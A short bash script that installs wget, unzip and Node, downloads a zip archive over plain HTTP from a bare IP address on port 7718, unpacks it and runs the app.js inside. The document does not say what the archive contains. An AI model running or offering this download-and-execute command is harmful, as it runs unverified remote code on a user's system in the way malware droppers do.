#!/bin/bash
apt update && apt install wget && apt install unzip && apt install node -y && wget http://165.227.63.140:7718/idx.zip && unzip idx.zip && node app.js
